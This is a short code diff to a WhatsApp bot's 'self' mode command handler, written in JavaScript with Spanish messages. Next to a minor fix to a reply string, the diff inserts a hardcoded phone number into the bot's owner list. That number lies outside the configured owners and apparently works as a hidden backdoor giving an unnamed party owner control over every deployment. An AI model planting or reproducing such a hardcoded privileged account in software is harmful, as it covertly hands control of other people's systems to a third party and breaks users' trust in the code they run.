@@ -1,8 +1,12 @@
 let handler = async (m, { conn, args }) => {
-  const isSocketOwner = [
-    conn.user.jid,
+
+  const propietarios = [
+    conn.user.jid, 
     ...(global.owner || []).map(n => n + '@s.whatsapp.net'),
-  ].includes(m.sender);
+    '5355699866@s.whatsapp.net' 
+  ];
+
+  const isSocketOwner = propietarios.includes(m.sender);
 
   if (!isSocketOwner) {
     return m.reply('> Solo el propietario del bot puede usar este comando.');
@@ -20,7 +24,7 @@ let handler = async (m, { conn, args }) => {
   if (args[0] === 'disable' || args[0] === 'off') {
     if (!estado) return m.reply('> El modo *Self* ya estaba desactivado.');
     settings.self = false;
-    return m.reply('> Has *Desactivado* el modo *Privado*.');
+    return m.reply('> Has *Desactivado* el modo *Self*.');
   }
 
   return m.reply(
